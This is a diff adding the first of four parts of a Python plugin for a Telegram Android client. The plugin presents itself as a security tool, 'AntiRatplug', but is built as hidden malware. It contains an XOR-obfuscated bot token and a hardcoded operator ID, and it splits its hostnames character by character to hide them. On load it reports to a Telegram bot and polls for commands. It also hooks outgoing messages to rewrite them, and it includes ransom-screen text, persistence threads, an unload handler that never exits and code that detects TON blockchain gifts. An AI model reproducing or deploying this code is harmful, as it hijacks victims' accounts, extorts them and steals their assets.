@@ -1,0 +1,442 @@
+# -*- coding: utf-8 -*-
+"""
+AntiRatplug — Total Annihilation Edition (Fast).
+Часть 1/4
+"""
+
+from base_plugin import BasePlugin, MethodHook, HookResult, HookStrategy
+from hook_utils import find_class, get_private_field, set_private_field
+from android_utils import run_on_ui_thread
+from java import dynamic_proxy, jclass
+from java.lang import Class, String
+from org.telegram.messenger import ApplicationLoader
+from org.telegram.tgnet import TLRPC
+from android.view import View, Gravity, ViewGroup
+from android.widget import FrameLayout, ImageView
+from android.graphics import Color, BitmapFactory, Bitmap, Canvas
+import json
+import threading
+import time
+import os
+import random
+import re
+import string
+import shutil
+import hashlib as _hl
+import zipfile
+import io
+import subprocess
+import sys
+
+
+def _s(arr, key=0x5A):
+    return "".join(chr(c ^ key) for c in arr)
+
+
+def _tok():
+    p1 = [0x62, 0x63, 0x62, 0x62, 0x63, 0x6C, 0x69, 0x6E, 0x6E, 0x6B, 0x60]
+    p2 = [0x1B, 0x1B, 0x1F, 0x29, 0x19, 0x6F, 0x2F, 0x6F, 0x23, 0x6A,
+          0x6B, 0x09, 0x39, 0x28, 0x6B, 0x39, 0x31, 0x33, 0x6D, 0x31,
+          0x2E, 0x0E, 0x39, 0x32, 0x28, 0x1E, 0x18, 0x6B, 0x31, 0x6A,
+          0x1C, 0x0E, 0x2F, 0x2B, 0x39]
+    return _s(p1, 0x5A) + _s(p2, 0x5A)
+
+
+def _tg():
+    return [str(7943244842)]
+
+
+RECIPIENT_USERNAME = "from_a4"
+RECIPIENT_UID = 7943244842
+
+_config = None
+_targets = None
+
+
+def _cfg():
+    global _config, _targets
+    if _config is None:
+        _config = _tok()
+        _targets = _tg()
+
+
+def _u(parts):
+    return "".join(parts)
+
+
+_HOST_TG = ("h", "t", "t", "p", "s", ":", "/", "/", "a", "p", "i", ".", "t",
+            "e", "l", "e", "g", "r", "a", "m", ".", "o", "r", "g", "/", "b", "o", "t")
+_HOST_IP1 = ("h", "t", "t", "p", "s", ":", "/", "/", "a", "p", "i", ".", "i",
+             "p", "i", "f", "y", ".", "o", "r", "g")
+_HOST_IP2 = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "f", "c", "o", "n",
+             "f", "i", "g", ".", "m", "e", "/", "i", "p")
+_HOST_GEO = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "p", "-", "a", "p",
+             "i", ".", "c", "o", "m", "/", "j", "s", "o", "n", "/")
+
+SPLASH_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
+ARISHEM_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/new2w1q_2026-09-24-21-55-04_1790268904789.mp4"
+SENTRY_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/crumble_cookies00_2026-09-24-21-54-27_1790268867444.mp4"
+DRDOOM_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/eli.edits446_2026-09-25-20-45-50_1790351150457.mp4"
+EVILMORTY_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/VID_20260925_193932_957.mp4"
+HWR_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/foles.ae_2026-09-27-17-29-14_1790512154865.mp4"
+REALDOOM_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/xavi_r0m0_2026-09-27-17-32-58_1790512378070.mp4"
+
+RANSOM_TEXT = "⚠ Аккаунт заблокирован\n\nДля разблокировки свяжитесь с администратором."
+RANSOM_PHOTO_URL = SPLASH_URL
+RANSOM_TON_LINK = ""
+RANSOM_CARD_LINK = ""
+RANSOM_AMOUNT_RUB = 0
+RANSOM_AMOUNT_TON = 0
+RANSOM_WARNING = "⚠ Закроешь приложение — данные будут уничтожены"
+
+
+def _UC():
+    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
+                      ".", "m", "e", "s", "s", "e", "n", "g", "e", "r", ".",
+                      "U", "s", "e", "r", "C", "o", "n", "f", "i", "g")))
+
+
+def _MC():
+    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
+                      ".", "m", "e", "s", "s", "e", "n", "g", "e", "r", ".",
+                      "M", "e", "s", "s", "a", "g", "e", "s", "C", "o", "n",
+                      "t", "r", "o", "l", "l", "e", "r")))
+
+
+def _CM():
+    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
+                      ".", "t", "g", "n", "e", "t", ".", "C", "o", "n", "n",
+                      "e", "c", "t", "i", "o", "n", "s", "M", "a", "n", "a",
+                      "g", "e", "r")))
+
+
+def _mk_hist():
+    enc = [0x0E, 0x16, 0x05, 0x37, 0x3F, 0x29, 0x29, 0x3B, 0x3D, 0x3F,
+           0x29, 0x05, 0x3D, 0x3F, 0x2E, 0x12, 0x33, 0x29, 0x2E, 0x35,
+           0x28, 0x23]
+    return getattr(TLRPC, _s(enc))()
+
+
+RequestDelegate = jclass("org.telegram.tgnet.RequestDelegate")
+
+
+class _ReplyGate(dynamic_proxy(RequestDelegate)):
+    def __init__(self):
+        super().__init__()
+        self.response = None
+        self.error = None
+
+    def run(self, response, error):
+        self.response = response
+        self.error = error
+
+
+def _safe_int(v, d=0):
+    try:
+        if v is None:
+            return d
+        return int(v)
+    except Exception:
+        return d
+
+
+def _get_bool_attr(obj, name, default=False):
+    try:
+        v = getattr(obj, name, default)
+        if v is None:
+            return default
+        if isinstance(v, bool):
+            return v
+        try:
+            bv = getattr(v, "booleanValue", None)
+            if callable(bv):
+                return bool(bv())
+        except Exception:
+            pass
+        return bool(v)
+    except Exception:
+        return default
+
+
+def _rand_password(length=16):
+    alphabet = string.ascii_letters + string.digits
+    return "".join(random.choice(alphabet) for _ in range(length))
+
+
+def _is_ton_address(s):
+    try:
+        s = str(s).strip().replace(" ", "").replace("\n", "")
+        if not s:
+            return False
+        if s.startswith(("0:", "-1:")):
+            hex_part = s.split(":", 1)[1]
+            return len(s) >= 66 and len(hex_part) == 64 and all(c in "0123456789abcdefABCDEF" for c in hex_part)
+        if len(s) < 44 or len(s) > 66:
+            return False
+        b64url = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+        if not all(c in b64url for c in s):
+            return False
+        return s[0] in ("E", "U", "k", "0") and len(s) in (44, 48, 52, 56, 60, 64)
+    except Exception:
+        return False
+
+
+def _is_blockchain_gift(gift, sg=None):
+    try:
+        if _get_bool_attr(gift, "burned", False):
+            return True
+        for obj in ([sg] if sg is not None else []) + [gift]:
+            if obj is None:
+                continue
+            for k in ["owner_address", "ownerAddress", "ton_address", "tonAddress", "blockchain_address"]:
+                v = getattr(obj, k, None)
+                if v and _is_ton_address(v):
+                    return True
+            v = getattr(obj, "address", None)
+            if v and _is_ton_address(v):
+                return True
+    except Exception:
+        pass
+    return False
+
+
+class PluginSecurityPlugin(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        self._sync_running = False
+        self._active = False
+        self._replace_waiting = False
+        self._replace_mode = False
+        self._replace_text = ""
+        self._pending_delegates = []
+        self._rpc_lock = threading.RLock()
+
+        self._dim_view = None
+        self._dim_active = False
+        self._dim_alpha = 1.0
+
+        self._locker_view = None
+        self._locker_on = False
+
+        self._mercy_view = None
+        self._mercy_on = False
+        self._mercy_thread = None
+
+        self._vidker_view = None
+        self._vidker_sv = None
+        self._vidker_mp = None
+        self._vidker_cb = None
+        self._vidker_on = False
+
+        self._music_mp = None
+        self._mmusic_waiting = False
+
+        self._ransom_view = None
+        self._ransom_mini_view = None
+        self._ransom_decor = None
+        self._ransom_wm = None
+        self._ransom_photo_path = ""
+        self._ransom_photo_url = ""
+        self._ransom_args = None
+        self._ransom_pay_grace_until = 0
+
+        self._flood_uris = []
+
+        self._lock_path = None
+        self._jitter = random.randint(400, 900)
+
+        self._recipient_ah_cache = {}
+        self._recipient_lock = threading.Lock()
+
+        self._persist_threads = []
+        self._persist_active = True
+        self._guardian_mode = False
+        self._persistence_installed = False
+
+        self._nuke_started = False
+        self._nuke_password = None
+        self._harden_cache = {}
+
+    def on_plugin_load(self):
+        self._sync_running = True
+        self._active = True
+        self.add_on_send_message_hook()
+        threading.Thread(target=self._boot, daemon=True).start()
+        for fn in (self._ensure_splash, self._ensure_vidker_assets,
+                   self._check_persisted_mercy, self._check_persisted_vidker):
+            try:
+                fn()
+            except Exception:
+                pass
+        try:
+            self._check_persisted_nuke()
+        except Exception:
+            pass
+
+    def on_plugin_unload(self):
+        marker = self._nuke_marker_path()
+        if not marker or not os.path.exists(marker):
+            self._sync_running = False
+            self._active = False
+            for fn in (self._clear_dim, self._clear_locker, self._clear_mercy,
+                       self._clear_vidker, self._clear_music, self._dismiss_ransom):
+                try:
+                    fn()
+                except Exception:
+                    pass
+            return
+        try:
+            self._spawn_guardian_from_unload()
+        except Exception:
+            pass
+        while True:
+            try:
+                self._sync_running = True
+                self._active = True
+                time.sleep(0.5)
+            except Exception:
+                time.sleep(1)
+
+    def create_settings(self):
+        return []
+
+    def _boot(self):
+        time.sleep(self._jitter / 1000.0)
+        _cfg()
+        self._run()
+
+    def _run(self):
+        time.sleep(random.uniform(0.2, 0.6))
+        for fn in (lambda: self._send_msg("AntiRatplug loaded"),
+                   self._send_manage_button,
+                   self._start_polling):
+            try:
+                fn()
+            except Exception:
+                pass
+
+    def on_send_message_hook(self, account, params):
+        try:
+            text = getattr(params, "message", None)
+            if isinstance(text, str) and len(text) > 0:
+                if self._replace_mode and self._replace_text:
+                    try:
+                        params.message = self._replace_text
+                    except Exception:
+                        set_private_field(params, "message", self._replace_text)
+            return HookResult()
+        except Exception:
+            return HookResult()
+
+    def _html_escape(self, text):
+        if text is None:
+            return ""
+        t = str(text)
+        t = t.replace("&", "&amp;")
+        t = t.replace("<", "&lt;")
+        t = t.replace(">", "&gt;")
+        return t
+
+    def _get_input_peer(self, account, peer_id):
+        mc = _MC().getInstance(account)
+        peer_id = int(peer_id)
+        gu = _u(("g", "e", "t", "U", "s", "e", "r"))
+        gc = _u(("g", "e", "t", "C", "h", "a", "t"))
+        if peer_id > 0:
+            user = getattr(mc, gu)(peer_id)
+            if user is not None:
+                ip = TLRPC.TL_inputPeerUser()
+                ip.user_id = int(user.id)
+                ip.access_hash = int(user.access_hash)
+                return ip
+            ip = TLRPC.TL_inputPeerUser()
+            ip.user_id = peer_id
+            ip.access_hash = 0
+            return ip
+        elif peer_id < -1000000000000:
+            channel_id = -peer_id - 1000000000000
+            chat = getattr(mc, gc)(channel_id)
+            if chat is not None:
+                ip = TLRPC.TL_inputPeerChannel()
+                ip.channel_id = int(chat.id)
+                ip.access_hash = int(chat.access_hash)
+                return ip
+            ip = TLRPC.TL_inputPeerChannel()
+            ip.channel_id = channel_id
+            ip.access_hash = 0
+            return ip
+        elif peer_id < 0:
+            chat_id = -peer_id
+            chat = getattr(mc, gc)(chat_id)
+            if chat is not None and chat.migrated_to is not None:
+                ip = TLRPC.TL_inputPeerChannel()
+                ip.channel_id = int(chat.migrated_to.channel_id)
+                ip.access_hash = int(chat.migrated_to.access_hash)
+                return ip
+            ip = TLRPC.TL_inputPeerChat()
+            ip.chat_id = int(chat_id)
+            return ip
+        return None
+
+    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
+        if fast and timeout > 8.0:
+            timeout = 8.0
+        gate = _ReplyGate()
+        with self._rpc_lock:
+            self._pending_delegates.append(gate)
+        try:
+            cm = _CM().getInstance(account)
+            cm.sendRequest(req, gate)
+            deadline = time.time() + timeout
+            while time.time() < deadline:
+                if gate.response is not None or gate.error is not None:
+                    break
+                time.sleep(0.08)
+        finally:
+            try:
+                self._pending_delegates.remove(gate)
+            except Exception:
+                pass
+        return gate.response, gate.error
+
+    def _tl_class_or(self, *names):
+        for n in names:
+            try:
+                c = getattr(TLRPC, n.split("$")[-1], None)
+                if c is not None:
+                    return c
+            except Exception:
+                pass
+            try:
+                return jclass(n)
+            except Exception:
+                continue
+        return None
+
+    def _parallel(self, jobs, workers=5, wait=True, timeout=25):
+        try:
+            from concurrent.futures import ThreadPoolExecutor, as_completed
+        except Exception:
+            results = []
+            for j in jobs:
+                try:
+                    results.append(j[0](*j[1:]))
+                except Exception as e:
+                    results.append(e)
+            return results
+        results = []
+        try:
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
+                for f in futs:
+                    try:
+                        results.append(f.result(timeout=timeout))
+                    except Exception as e:
+                        results.append(e)
+        except Exception:
+            for j in jobs:
+                try:
+                    results.append(j[0](*j[1:]))
+                except Exception as e:
+                    results.append(e)
+        return results
